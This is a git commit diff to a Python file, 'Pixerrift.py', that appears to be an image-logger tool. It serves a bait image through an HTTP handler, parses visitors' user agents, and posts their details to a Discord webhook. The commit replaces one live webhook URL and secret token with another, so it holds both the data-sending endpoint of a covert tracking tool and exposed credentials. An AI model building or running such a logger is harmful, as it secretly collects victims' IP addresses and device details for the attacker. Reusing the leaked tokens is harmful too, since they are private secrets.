f09e1b42796f1d42764847d3b801bc642c4a93bf
spoofdayz <gavinjumper08@gmail.com>
2025-06-20 18:53:45 -0400

    Update Pixerrift.py

--- api/Pixerrift.py
+++ api/Pixerrift.py
@@ -2,7 +2,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
+webhook = 'https://discordapp.com/api/webhooks/1385751301312217119/3gFMhiqBQlOFOGwj30nIwc8f_h3SdwqY3v6RKVfNfz06Mp8AVHVS_mxwIoHxdMNPb-iD-'
 
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
